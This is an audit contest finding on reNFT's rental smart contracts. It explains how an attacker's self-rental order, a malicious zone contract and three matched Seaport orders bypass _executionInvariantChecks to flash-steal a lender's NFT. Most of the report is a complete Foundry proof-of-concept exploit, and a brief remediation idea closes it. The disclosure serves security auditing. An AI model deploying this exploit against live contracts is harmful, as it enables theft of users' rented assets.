# [M] An attacker can flash steal rented NFTs by bypassing `_executionInvariantChecks()` checks.

## Summary
Severity: Medium
Chain: Smart contract
Component: 2024-02-renft-mitigation
Published: 2024-03-04
Source: https://github.com/code-423n4/2024-02-renft-mitigation-findings/issues/29
Type: code-finding

## Details
# Lines of code

https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L590


# Vulnerability details


# Impact
This vulnerability allows an attacker to temporarily steal (flash steal) an NFT allowing him to bypass the hooks enforced by the lender of the NFT. Similar impact to https://github.com/code-423n4/2024-01-renft-findings/issues/466



# The vulnerability & Proof of concept

The exploitation of this vulnerability relies on multiple primitives however the most important exploit primitive would be that the [`_executionInvariantChecks()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L590) function check can be bypassed if the address of the offerer of the rental order is the same as the address of the borrower (recipient). In this case, the seaport conduit does not conduct any token transfers and these transfers/executions aren't included in the `seaportPayload.totalExecutions` array which is fed into the [`_executionInvariantChecks()`](https://github.com/re-nft/smart-contracts/blob/97e5753e5398da65d3d26735e9d6439c757720f5/src/policies/Create.sol#L590) function. [`From seaport docs on matchOrders`](https://github.com/ProjectOpenSea/seaport/blob/main/docs/SeaportDocumentation.md#match-orders)

> Use either conduit or Seaport directly to source approvals, depending on the original order type

> Ignore each execution where to == from

Because this is a sophisticated exploit, I'll break it down step by step:

0. Let's say the attacker is going to be hijacking NFT ID 5 in a legitimate `PAY` order lent by Alice. This will be a legitimate order with the following parameters:
    - Offer item #1: NFT ID 5
    - Offer item #2: 100 ERC20 tokens
    - Lender: Alice
    - Borrower: address_of_attackers_Rental_Safe

1. The attacker will construct a malicious `PAY` order. The offerItems of the order to be NFT ID 5, the 100 ERC20 tokens and the offerer (lender) of the order would be the attacker's rental safe, and the fulfiller would also be the rental safe. So in conclusion, the order will have the following parameters:
    
    - Offer item #1: NFT ID 5
    - Offer item #2: 100 ERC20 tokens
    - Lender: address_of_attackers_Rental_Safe
    - Borrower: address_of_attackers_Rental_Safe

2. The attacker will construct a useless `PAY` order and specify a zone contract he controls to be called. This order's only use is that it'll allow us to execute any zone contract we specify to it.

3. The attacker will call `matchAdvancedOrders` and supply the three pay orders to it in this order:

    - Order 1: The malicious `PAY` order constructed in step 1
    - Order 2: The "malicious zone" `PAY` order allowing us to execute a custom zone contract
    - Order 3: The legitimate `PAY` order where Alice is the lender 

4. Seaport will first conduct all the token transfers prior to calling any zones:

    - Attempt conducting transfers for order 1 (malicious order): No transfers will be made, because `recipient == offerer` / `to == from` (in other words)
    - Attempt conducting transfers for order 2 (malicious zone order): Won't conduct any transfers, you can construct it to not conduct transfers (shown in the PoC). But assuming you can't, this isn't really relevant to this exploit and won't affect it.
    - Attempt conducting transfers for order 3 (legitimate order): Two transfers will be made, the NFT ID 5 will be transferred from Alice to the `Create` policy and the 100 ERC20 tokens will also be transferred from Alice to the `Create` policy

5. After executing all the transfers associated with each of the three orders, seaport will begin interacting with the zone of each order, it will do the following:

    - Communicate with the zone associated with order 1 (malicious order): The zone associated with this order is the `Create` policy. Seaport will call `validateOrder()` and begin rental registeration. `validateOrder` will call the internal function `_rentFromZone()` which will begin the actual rental registeration process. What we care about is the `_executionInvariantChecks()` function

        ```solidity

            function _rentFromZone(
                RentPayload memory payload,
                SeaportPayload memory seaportPayload
            ) internal {
                // Check: Only full restricted orders are supported.
                _isValidSeaportOrderType(seaportPayload.orderType);

                // Check: The payload is being used for the correct order.
                _isValidPayloadForOrder(payload.orderHash, seaportPayload.orderHash);

                // Check: make sure order metadata is valid with the given seaport order zone hash.
                _isValidOrderMetadata(payload.metadata, seaportPayload.zoneHash);

                // Check: verify the fulfiller of the order is an owner of the recipient safe.
                _isValidSafeOwner(seaportPayload.fulfiller, payload.fulfillment.recipient);

                // Check: verify each execution was sent to the expected destination.
        ----->  _executionInvariantChecks(seaportPayload.totalExecutions);

        ```

        ```solidity

            function _executionInvariantChecks(ReceivedItem[] memory executions) internal view {
        ------> for (uint256 i = 0; i < executions.length; ++i) {
                    ReceivedItem memory execution = executions[i];

                    // All tokens must first be sent to the Create Policy.
                    if (execution.recipient != address(this)) {
                        revert Errors.CreatePolicy_UnexpectedTokenRecipient(
                            execution.itemType,
                            execution.token,
                            execution.identifier,
                            execution.amount,
                            execution.recipient,
                            address(this)
                        );
                    }
                }
            }

        ```

        In `_executionInvariantChecks()`, the `executions` won't have any entries, because no transfers were conducted when the seaport conduit attempted to conduct the transfers associated with this order (Point 4.1).

        With that being said, the `items` array which holds the offer & consideration (if any) items associated with the order will NOT be empty and will be contain the offer & consideration items associated with the order. When we constructed the malicious order, we set two offer items: the NFT ID 5 and the 100 ERC20 tokens.

        ```solidity

                bytes32 orderHash = _deriveRentalOrderHash(order);

                // Interaction: Update storage only if the order is a Base Order or Pay order.
                STORE.addRentals(orderHash, _convertToStatic(rentalAssetUpdates), items);

                // Interaction: Send tokens to their expected destinations. The rented assets
                // will go to the rental wallet and the payments will go to the escrow.
        ------> for (uint256 i = 0; i < items.length; ++i) {
                    Item memory item = items[i];

        -------->   if (item.isERC20()) {
                        // Send tokens to the payment escrow.
                        item.token.transferERC20(address(ESCRW), item.amount);

                        // increase deposit on the escrow
                        ESCRW.increaseDeposit(item.token, item.amount);
        ------->    } else if (item.isERC721()) {
                        // Send ERC721 to the rental wallet.
                        item.transferERC721(order.rentalWallet);
        ------->    } else if (item.isERC1155()) {
                        // Send ERC1155 to the rental wallet.
                        item.transferERC1155(order.rentalWallet);
                    }
                }

        ```

        Seaport will iterate through them and transfer the NFT to the rental wallet (in this case, it's the attacker's rental wallet), and it will transfer the ERC20 to the payment escrow contract.

        And the rental will begin normally


    - After seaport has communicated with the zone associated with the first order, it'll go ahead and talk to the zone of the 2nd order (which is the malicious zone order we constructed). It'll communicate with a malicious zone that is attacker controlled.
        - The malicious zone will do three things:
            
            1. It'll stop the malicious pay order rental (so that we can transfer the ERC721 and ERC20 out of the rental safe). Since the owner of the PAY order is the attacker's rental safe, the malicious zone will utilize a pre-signed `stopRent` TX (shown in PoC), call `execTransaction` on the attacker's rental safe and feed it the pre-signed `stopRent` TX (shown in PoC).

            2. It'll transfer the ERC721 and ERC20 tokens from the attacker's rental safe to the malicious zone contract to do whatever it wants with it (bypass hook restrictions). It'll do so by utilizing a pre-signed `transferFrom` TX (shown in PoC), like the previous step.

            3. After the malicious zone does whatever it wants with the tokens (bypass hook restrictions), it'll transfer them back to the create policy to allow for the legitimate order to be registered normally without reverting.

    - After seaport has communicated with the zone associated with the first order, it'll go ahead and talk to the zone of the 3rd and final order which is the actual legitimate order. It'll communicate with the Create Policy zone which will continue the execution flow and the legitimate rental order will start.



This exploit relies on three exploit primitives:
1. All seaport transfers happen prior to interaction with zones
2. An attacker can hijack the execution flow by creating an order that interacts with a custom zone of his
3. `_executionInvariantChecks` can be bypassed if `to == from`
 
Here is the order of all the operations which occur:

======

TRANSFER #1 -> MaliciousPayOrder (No token transfers occur)<br>
TRANSFER #2 -> MaliciousZoneOrder (No token transfers occur)<br>
TRANSFER #3 -> LegitimateOrder (Token transfers occur)<br>
ZONE_INTERACTION #4 -> MaliciousPayOrder (Create Policy)<br>
ZONE_INTERACTION #5 -> MaliciousZoneOrder (Malicious Zone)<br>
ZONE_INTERACTION #6 -> LegitimateOrder (Create Policy)<br>

## Proof of concept scenario






# Coded PoC

To run the PoC, you'll need to do the following:

1. You'll need to add this file to the `test/` folder:  
    i. `Exploit.sol` -> File containing the PoC

2. You'll need to run this command:

    `forge test --mt test_FlashSteal_NFT -vv`


**The files:**

<details>
<summary><b>Exploit.sol</b></summary>
<br>

    // SPDX-License-Identifier: BUSL-1.1
    pragma solidity ^0.8.20;

    import {
        Order,
        FulfillmentComponent,
        Fulfillment,
        ItemType as SeaportItemType,
        CriteriaResolver,
        AdvancedOrder,
        OfferItem,
        ConsiderationItem,
        OrderComponents,
        OrderType as SeaportOrderType,
        ItemType
    } from "@seaport-types/lib/ConsiderationStructs.sol";

    import {
        ZoneParameters
    } from "@seaport-core/lib/rental/ConsiderationStructs.sol";

    import {
        OfferItemLib,
        OrderComponentsLib,
        ConsiderationItemLib,
        OrderLib
    } from "@seaport-sol/SeaportSol.sol";

    import {Seaport} from "@seaport-core/Seaport.sol";
    import {ZoneInterface} from "@src/interfaces/IZone.sol";
    import {Zone} from "@src/packages/Zone.sol";
    import {TokenReceiver} from "@src/packages/TokenReceiver.sol";
    import {Errors} from "@src/libraries/Errors.sol";
    import {ISafe} from "@src/interfaces/ISafe.sol";

    import {OrderType, OrderMetadata, RentalOrder} from "@src/libraries/RentalStructs.sol";
    import {Events} from "@src/libraries/Events.sol";
    import {ECDSA} from "@openzeppelin-contracts/utils/cryptography/ECDSA.sol";

    import {ERC721} from '@openzeppelin-contracts/token/ERC721/ERC721.sol';
    import {IERC721} from '@openzeppelin-contracts/token/ERC721/IERC721.sol';
    import {Ownable} from "@openzeppelin-contracts/access/Ownable.sol";
    import {ERC1155} from '@openzeppelin-contracts/token/ERC1155/ERC1155.sol';
    import {IERC1155} from '@openzeppelin-contracts/interfaces/IERC1155.sol';
    import {IERC20} from '@openzeppelin-contracts/interfaces/IERC20.sol';

    import {ProtocolAccount} from "@test/utils/Types.sol";
    import {BaseTest} from "@test/BaseTest.sol";
    import {Assertions} from "@test/utils/Assertions.sol";
    import {Constants} from "@test/utils/Constants.sol";
    import {SafeUtils} from "@test/utils/GnosisSafeUtils.sol";
    import {Enum} from "@safe-contracts/common/Enum.sol";

    import "forge-std/console.sol";



    contract Exploit is Assertions, Constants, BaseTest {

        using OfferItemLib for OfferItem;
        using ConsiderationItemLib for ConsiderationItem;
        using OrderComponentsLib for OrderComponents;
        using OrderLib for Order;
        using ECDSA for bytes32;


        address public ERC721TokenToFlashSteal;
        address public ERC20TokenToReturnToCreatePolicyAfterTheft;

        MaliciousZone public maliciousZone;

        function test_FlashSteal_NFT() public {

            // This will be the token we will be flash stealing. In other words, it will be the token Alice (the victim lender), will be lending
            //      to bob, the attacker.
            ERC721TokenToFlashSteal = address(erc721s[0]);

            // Alice will be rewarding bob with erc20 for the PAY order so those also will be flash stolen (although flash stealing erc20 is useless)
            ERC20TokenToReturnToCreatePolicyAfterTheft = address(erc20s[0]);

            // Deploy the malicious zone contract
            maliciousZone = new MaliciousZone(
                address(bob.safe), 
                address(stop),
                address(create), 
                ERC721TokenToFlashSteal,
                ERC20TokenToReturnToCreatePolicyAfterTheft
            );

            // Construct the malicious PAY order, where bob will be lending himself.
            // The lender will be bob's rental safe and the borrower will be bob's rental safe as well.
            // The recipient will be the same as the offerer, so `executionInvariantChecks` will be bypassed.
            // The offer item will be set to the same NFT as the ones Alice will be lending Bob (aka, the NFT we will be hijacking).
            // This order will be executed first.
            constructMaliciousPAYOrder();
            
            // This is just a useless intermediary order just so that we get to execute a malicious zone contract of ours between
            //     the execution of the malicious pay order and the legitimate. So with this order, we're just hijacking the execution flow
            constructMaliciousZoneOrder();


            // This is the legitimate PAY order, where Alice will be lending Bob (attacker), an NFT and ERC20 which will both be flash stolen.
            constructLegitimatePAYOrder();
            

            // Prepare to fulfill all three orders
            (
                RentalOrder memory maliciousRentalOrder,
                RentalOrder memory maliciousZoneRentalOrder,
                RentalOrder memory legitimateRentalOrder
                
            ) = prepareOrdersForFulfilling();


            // Prepare the pre-signed TXs which the intermediary malicious zone contract will execute.
            preparePreSignedTXs(maliciousRentalOrder);


            // Fulfill all three orders and begin exploitation!!!!
            fulfillAllOrders();




        }


        function preparePreSignedTXs(RentalOrder memory maliciousRentalOrder) public {

            /** ---------------------- First TX ---------------------- */

            // TX call data to stop the rental once we arrive at the malicious zone
            bytes memory transaction = abi.encodeWithSelector(
                stop.stopRent.selector,
                maliciousRentalOrder
            );

            (uint8 v, bytes32 r, bytes32 s) = vm.sign(

                bob.privateKey, 

                ISafe(address(bob.safe)).getTransactionHash(
                    address(stop),
                    0 ether,
                    transaction,
                    Enum.Operation.Call,
                    0 ether,
                    0 ether,
                    0 ether,
                    address(0),
                    payable(address(0)),
                    ISafe(address(bob.safe)).nonce()
                )
                
            );

            bytes memory transactionSignature = abi.encodePacked(r, s, v); // Signature of the TX of rental stopping.

            // Setting those values on the malicious zone contract
            maliciousZone.setStopRentTXSignature(transactionSignature);
            maliciousZone.setStopRentTXCalldata(transaction);


            /** ---------------------- Second TX ---------------------- */

            // TX call data to transfer the flash stolen NFT back to the Create Policy after we're done using it.
            transaction = abi.encodeWithSelector(
                IERC721.transferFrom.selector,
                address(bob.safe),
                address(maliciousZone),
                1
            );


            (v, r, s) = vm.sign(

                bob.privateKey, 

                ISafe(address(bob.safe)).getTransactionHash(
                    address(ERC721TokenToFlashSteal),
                    0 ether,
                    transaction,
                    Enum.Operation.Call,
                    0 ether,
                    0 ether,
                    0 ether,
                    address(0),
                    payable(address(0)),
                    ISafe(address(bob.safe)).nonce()+1
                )
            );
            
            transactionSignature = abi.encodePacked(r, s, v); // Signature of the ERC721 token transferal TX.

            // Setting those values on the malicious zone contract.
            maliciousZone.setTransferFromERC721TXSignature(transactionSignature);
            maliciousZone.setTransferFromERC721TXCalldata(transaction);


            /** ---------------------- Third TX ---------------------- */

            // TX call data to transfer the flash stolen ERC20 back to the Create Policy.
            transaction = abi.encodeWithSelector(
                IERC20.transfer.selector,
                address(create),
                100
            );


            (v, r, s) = vm.sign(

                bob.privateKey, 

                ISafe(address(bob.safe)).getTransactionHash(
                    address(ERC20TokenToReturnToCreatePolicyAfterTheft),
                    0 ether,
                    transaction,
                    Enum.Operation.Call,
                    0 ether,
                    0 ether,
                    0 ether,
                    address(0),
                    payable(address(0)),
                    ISafe(address(bob.safe)).nonce()+2
                )
            );
            
            transactionSignature = abi.encodePacked(r, s, v);  // Signature of the ERC20 token transferal TX.

            // Setting those values on the malicious zone contract
            maliciousZone.setTransferFromERC20TXSignature(transactionSignature);
            maliciousZone.setTransferFromERC20TXCalldata(transaction);

        }


        // Construct the malicious PAY order
        function constructMaliciousPAYOrder() public returns(Order memory payOrder, bytes32 payOrderHash, OrderMetadata memory payOrderMetadata) {

            // Cache bob's original EOA address.
            address bobsOriginalEOA_Address = bob.addr;

            // We're making this fixture because we want bob's rental safe to be the lender (smart contract), not bob himself (EOA).
            bob.addr = address(bob.safe);

            // create a legit PAY order
            createOrder({
                offerer: bob,
                orderType: OrderType.PAY,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 1,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 0
            });

            // Reset the value back.
            bob.addr = bobsOriginalEOA_Address;

            popOfferItem(); // Remove the pre-inserted ERC721 offer item
            popOfferItem(); // Remove the pre-inserted ERC20 offer item

            withOfferItem(
                OfferItemLib
                    .empty()
                    .withItemType(ItemType.ERC721)
                    .withToken(address(ERC721TokenToFlashSteal))
                    .withIdentifierOrCriteria(1)
                    .withStartAmount(1)
                    .withEndAmount(1)
            );
            withOfferItem(
                OfferItemLib
                    .empty()
                    .withItemType(ItemType.ERC20)
                    .withToken(address(erc20s[0]))
                    .withIdentifierOrCriteria(0)
                    .withStartAmount(100)
                    .withEndAmount(100)
            );


            // create and sign the order
            (Order memory payOrder, bytes32 payOrderHash) = _signSeaportOrderForGnosisSafeBeingALender(
                orderToCreate.offerer,
                orderToCreate.offerItems,
                orderToCreate.considerationItems,
                orderToCreate.metadata
            );

            // pull order metadata into memory
            OrderMetadata memory payOrderMetadata = orderToCreate.metadata;

            // clear structs
            resetOrderToCreate();

            // create an order fulfillment for the pay order
            createOrderFulfillment({
                _fulfiller: bob,
                order: payOrder,
                orderHash: payOrderHash,
                metadata: payOrderMetadata
            });


            // create a malicious PAYEE order.
            createOrder({
                offerer: bob,
                orderType: OrderType.PAYEE,
                erc721Offers: 0,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 1,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            
            // We will remove the pre-inserted consideration items because the recipients are set to the Create policy,
            //   and we want them to be set to bob (the attacker), so that the offerer == recipient and `executionInvariantChecks` are bypassed.

            popConsiderationItem(); // Remove the pre-inserted ERC721 consideration item
            popConsiderationItem(); // Remove the pre-inserted ERC20 consideration item

            withConsiderationItem(
                ConsiderationItemLib
                    .empty()
                    .withItemType(ItemType.ERC721)
                    .withToken(address(ERC721TokenToFlashSteal))
                    .withIdentifierOrCriteria(1)
                    .withStartAmount(1)
                    .withEndAmount(1)
                    .withRecipient(address(bob.safe)) // Set the recipient to be the same as the offerer
            );
            withConsiderationItem(
                ConsiderationItemLib
                    .empty()
                    .withItemType(ItemType.ERC20)
                    .withToken(address(erc20s[0]))
                    .withIdentifierOrCriteria(0)
                    .withStartAmount(100)
                    .withEndAmount(100)
                    .withRecipient(address(bob.safe)) // Set the recipient to be the same as the offerer
            );


            // finalize the pay order creation
            (
                Order memory payeeOrder,
                bytes32 payeeOrderHash,
                OrderMetadata memory payeeOrderMetadata
            ) = finalizeOrder();

            // create an order fulfillment for the payee order
            createOrderFulfillment({
                _fulfiller: bob,
                order: payeeOrder,
                orderHash: payeeOrderHash,
                metadata: payeeOrderMetadata
            });

            withLinkedPayAndPayeeOrders({payOrderIndex: 0, payeeOrderIndex: 1});



        }

        // Construct the legitimate PAY order
        function constructLegitimatePAYOrder() public returns(Order memory payOrder, bytes32 payOrderHash, OrderMetadata memory payOrderMetadata) {

            // create a PAY order
            createOrder({
                offerer: alice,
                orderType: OrderType.PAY,
                erc721Offers: 1,
                erc1155Offers: 0,
                erc20Offers: 1,
                erc721Considerations: 0,
                erc1155Considerations: 0,
                erc20Considerations: 0
            });

            // finalize the pay order creation
            (
                Order memory payOrder,
                bytes32 payOrderHash,
                OrderMetadata memory payOrderMetadata
            ) = finalizeOrder();

            // create a PAYEE order. The fulfiller will be the offerer.
            createOrder({
                offerer: bob,
                orderType: OrderType.PAYEE,
                erc721Offers: 0,
                erc1155Offers: 0,
                erc20Offers: 0,
                erc721Considerations: 1,
                erc1155Considerations: 0,
                erc20Considerations: 1
            });

            // finalize the pay order creation
            (
                Order memory payeeOrder,
                bytes32 payeeOrderHash,
                OrderMetadata memory payeeOrderMetadata
            ) = finalizeOrder();

            // create an order fulfillment for the pay order
            createOrderFulfillment({
                _fulfiller: bob,
                order: payOrder,
                orderHash: payOrderHash,
                metadata: payOrderMetadata
            });

            // create an order fulfillment for the payee order
            createOrderFulfillment({
                _fulfiller: bob,
                order: payeeOrder,
                orderHash: payeeOrderHash,
                metadata: payeeOrderMetadata
            });

            withLinkedPayAndPayeeOrders({payOrderIndex: 3, payeeOrderIndex: 4});



        }

        // Construct the malicious zone order. It's a useless order, 
        //   we're just making it because it'll allow us to execute a zone of our choice and hijack the execution flow.
        function constructMaliciousZoneOrder() public {

            OrderComponentsLib
                .empty()
                .withOrderType(SeaportOrderType.FULL_RESTRICTED)
                .withZone(address(maliciousZone))
                .withStartTime(block.timestamp)
                .withEndTime(block.timestamp+500)
                .withSalt(10291312143)
                .withConduitKey(conduitKey)
                .saveDefault("malicious");
            
            orderToCreate.offerer = bob;
            
            orderToCreate.metadata.orderType = OrderType.BASE;
            orderToCreate.metadata.rentDuration = 300;
            orderToCreate.metadata.emittedExtraData = new bytes(0);
    
            OrderComponents memory orderComponents = OrderComponentsLib
                .fromDefault("malicious")
                .withOfferer(bob.addr)
                .withCounter(seaport.getCounter(bob.addr));
    
            bytes32 exploitOrderHash = seaport.getOrderHash(orderComponents);
    
            bytes memory signature = _signOrder(bob.privateKey, exploitOrderHash);
    
            Order memory exploitOrder = OrderLib
                .empty()
                .withParameters(orderComponents.toOrderParameters())
                .withSignature(signature);
    
            // create an order fulfillment
            createOrderFulfillment({
                _fulfiller: bob,
                order: exploitOrder,
                orderHash: exploitOrderHash,
                metadata: orderToCreate.metadata
            });

        }


        // Fulfill all three orders
        function fulfillAllOrders() public returns(RentalOrder memory legitimateRentalOrder, RentalOrder memory maliciousRentalOrder) {

            // the offerer of the PAYEE order fulfills the orders.
            vm.prank(fulfiller.addr);

            // fulfill the orders
            seaport.matchAdvancedOrders(
                deconstructOrdersToFulfill(),
                new CriteriaResolver[](0),
                seaportMatchOrderFulfillments,
                seaportRecipient
            );

            // clear structs
            resetFulfiller();
            resetOrdersToFulfill();
            resetSeaportMatchOrderFulfillments();

        }

        // Prepare orders for fulfilling by matching the PAY and PAYEE orders
        function prepareOrdersForFulfilling() public returns(RentalOrder memory, RentalOrder memory, RentalOrder memory) {

            // get the orders to fulfill

            OrderToFulfill memory maliciousPAYRentalOrder = ordersToFulfill[0];
            OrderToFulfill memory payeeOrder1 = ordersToFulfill[1];

            OrderToFulfill memory maliciousZoneOrder = ordersToFulfill[2];

            OrderToFulfill memory legitimatePAYOrder = ordersToFulfill[3];
            OrderToFulfill memory payeeOrder2 = ordersToFulfill[4];

            // create rental orders

            RentalOrder memory maliciousRentalOrder = _createRentalOrder(maliciousPAYRentalOrder);
            _createRentalOrder(payeeOrder1);

            RentalOrder memory maliciousZoneRentalOrder = _createRentalOrder(maliciousZoneOrder);

            RentalOrder memory legitimateRentalOrder = _createRentalOrder(legitimatePAYOrder);
            _createRentalOrder(payeeOrder2);


            return (maliciousRentalOrder, maliciousZoneRentalOrder, legitimateRentalOrder);

        }

        // Internal helper function
        function deconstructOrdersToFulfill()
            private
            view
            returns (AdvancedOrder[] memory advancedOrders)
        {
            // get the length of the orders to fulfill
            advancedOrders = new AdvancedOrder[](ordersToFulfill.length);

            // build up the advanced orders
            for (uint256 i = 0; i < ordersToFulfill.length; i++) {
                advancedOrders[i] = ordersToFulfill[i].advancedOrder;
            }
        }






        // A helper function to generate a signature for a rental order created by a rental safe smart contract.
        // Bob's rental safe will be the offerer of the malicious rental order.
        function _signSeaportOrderForGnosisSafeBeingALender(
            ProtocolAccount memory _offerer,
            OfferItem[] memory _offerItems,
            ConsiderationItem[] memory _considerationItems,
            OrderMetadata memory _metadata
        ) private returns (Order memory order, bytes32 orderHash) {
            // put offerer address on stack
            address offerer = _offerer.addr;

            // Build the order components
            OrderComponents memory orderComponents = OrderComponentsLib
                .fromDefault(STANDARD_ORDER_COMPONENTS)
                .withOfferer(offerer)
                .withOffer(_offerItems)
                .withConsideration(_considerationItems)
                .withZoneHash(create.getOrderMetadataHash(_metadata))
                .withCounter(seaport.getCounter(offerer));

            // generate the order hash
            orderHash = seaport.getOrderHash(orderComponents);

            // generate the signature for the order components
            bytes memory signature = _signSeaportOrderWithGnosisSafeBeingTheLender(_offerer.privateKey, orderHash);

            // create the order, but dont provide a signature if its a PAYEE order.
            // Since PAYEE orders are fulfilled by the offerer of the order, they
            // dont need a signature.
            if (_metadata.orderType == OrderType.PAYEE) {
                order = OrderLib.empty().withParameters(orderComponents.toOrderParameters());
            } else {
                order = OrderLib
                    .empty()
                    .withParameters(orderComponents.toOrderParameters())
                    .withSignature(signature);
            }

        }

        function _signSeaportOrderWithGnosisSafeBeingTheLender(
            uint256 signerPrivateKey,
            bytes32 orderHash
        ) private returns (bytes memory signature) {
            // fetch domain separator from seaport
            (, bytes32 domainSeparator, ) = seaport.information();

            bytes32 messageHash = fallbackPolicy.getMessageHashForSafe(bob.safe, abi.encodePacked(domainSeparator.toTypedDataHash(orderHash)));

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                bob.privateKey,
                messageHash
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);

        }


        function _signOrder(
            uint256 signerPrivateKey,
            bytes32 orderHash
        ) private view returns (bytes memory signature) {
            // fetch domain separator from seaport
            (, bytes32 domainSeparator, ) = seaport.information();

            // sign the EIP-712 digest
            (uint8 v, bytes32 r, bytes32 s) = vm.sign(
                signerPrivateKey,
                domainSeparator.toTypedDataHash(orderHash)
            );

            // encode the signature
            signature = abi.encodePacked(r, s, v);

        }



    }









    contract MaliciousZone {

        address private owner; // address of the attacker (bob.addr)
        address private attackersSafe; // address of the attacker's rental safe (bob.safe)
        address private stopPolicy; // the address of the ReNFT stop policy
        address private createPolicy; // the address of the ReNFT create policy
        address private erc721ToHijack; // the address of the ERC721 token to flash steal
        address private erc20ToHijack; // the address of the ERC20 token to flash steal
        

        bytes private stopRentTXCalldata; // calldata of the stopRent() TX which will be made
        bytes private stopRentTXSignature; // Signature of the stopRent() TX which will be made
        bytes private transferFromERC721TXCalldata; // calldata of the ERC721 transferFrom() TX which will be made
        bytes private transferFromERC721Signature; // Signature of the ERC721 transferFrom() TX which will be made
        bytes private transferFrom20TXCalldata; // calldata of the ERC20 transfer() TX which will be made
        bytes private transferFrom20TXSignature; // Signature of the ERC20 transfer() TX which will be made

        constructor(address _attackersSafe, address _stopPolicy, address _createPolicy, address _erc721ToHijack, address _erc20ToReturn) {
            attackersSafe = _attackersSafe;
            stopPolicy = _stopPolicy;
            createPolicy = _createPolicy;
            erc721ToHijack = _erc721ToHijack;
            erc20ToHijack = _erc20ToReturn;
            owner = msg.sender;
        }

        // A setter function to set the signature for a TX where the malicious self-rental will be stopped
        function setStopRentTXSignature(bytes memory _signature) external onlyOwner {
            stopRentTXSignature = _signature;
            
        }
        // A setter function to set the calldata for a TX where the malicious self-rental will be stopped
        function setStopRentTXCalldata(bytes memory _stopRentTXCalldata) external onlyOwner {
            stopRentTXCalldata = _stopRentTXCalldata;
        } 

        // A setter function to set the signature for a TX where the flash stolen token will be transfered from the rental safe to this zone contract
        function setTransferFromERC721TXSignature(bytes memory _signature) external onlyOwner {
            transferFromERC721Signature = _signature;   
        }

        // A setter function to set the calldata for a TX where the flash stolen token will be transfered from the rental safe to this zone contract
        function setTransferFromERC721TXCalldata(bytes memory _transferTXCalldata) external onlyOwner {
            transferFromERC721TXCalldata = _transferTXCalldata;
        }

        // A setter function to set the signature for a TX where the flash stolen ERC20 token in the order will be transfered from the rental safe to this zone contract
        function setTransferFromERC20TXSignature(bytes memory _signature) external onlyOwner {
            transferFrom20TXSignature = _signature;   
        }

        // A setter function to set the calldata for a TX where the flash stolen ERC20 token in the order will be transfered from the rental safe to this zone contract
        function setTransferFromERC20TXCalldata(bytes memory _transferTXCalldata) external onlyOwner {
            transferFrom20TXCalldata = _transferTXCalldata;
        }



        function validateOrder(
            ZoneParameters calldata zoneParams
        ) external returns (bytes4 validOrderMagicValue) {
    
            // Stop the malicious order rental.
            SafeUtils.executeTransaction(
                address(attackersSafe),
                address(stopPolicy),
                stopRentTXCalldata,
                stopRentTXSignature
            );

            // Transfer the token from the rental safe to this zone contract.
            SafeUtils.executeTransaction(
                address(attackersSafe),
                address(erc721ToHijack),
                transferFromERC721TXCalldata,
                transferFromERC721Signature
            );

            // Transfer the ERC20 tokens back to the Create Policy to allow for the legitimate order to be executed normally.
            SafeUtils.executeTransaction(
                address(attackersSafe),
                address(erc20ToHijack),
                transferFrom20TXCalldata,
                transferFrom20TXSignature
            );

            // Confirm that the zone contract owns the NFT and can do whatever it wants with it
            address ownerOfNFT = IERC721(erc721ToHijack).ownerOf(1);

            if (ownerOfNFT == address(this)) {
                console.log("The intermediary zone contract owned by the attacker now owns the NFT and can do whatever it wants with it!");

                // Do whatever you want and bypass the hooks
                // ..........

                // Transfer the NFT back to the create policy
                IERC721(erc721ToHijack).transferFrom(address(this), createPolicy, 1);


            }

            // Return the selector of validateOrder as the magic value.
            validOrderMagicValue = ZoneInterface.validateOrder.selector;
        }


        modifier onlyOwner {
            require(owner == msg.sender);
            _;
        }
    }


</details>


<br>

# Remediation

I believe one way to go about this is to ensure there is no discrepancy between the size of the `items` array and the `seaport.totalExecutions()` array.


## Assessed type

Access Control
